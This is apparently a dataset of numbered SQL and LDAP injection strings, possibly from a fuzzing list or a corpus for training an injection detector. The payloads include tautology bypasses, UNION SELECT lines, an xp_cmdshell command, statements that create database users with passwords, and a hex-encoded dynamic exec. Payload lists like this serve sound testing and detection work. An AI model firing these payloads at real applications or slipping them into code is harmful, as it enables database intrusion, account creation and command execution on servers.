10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
61  or 'something'   =   'some'+'thing' 
171  or userid like '% 
182 -- &password  =  
203  (  8266  =  8266  )  *9900 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
220 *| 
256 select * from information_schema.tables-- 
281 as 
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
499 or 'something'   =   'some'+'thing' 
555 create user name identified by 'pass123' 
710 ns 
758 \x27UNION SELECT 
935  or uname like '% 
984 make_set  (  5679  =  9769,9769  )   
1022 elt  (  2567  =  9921,9921  )   
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1094 ^' 
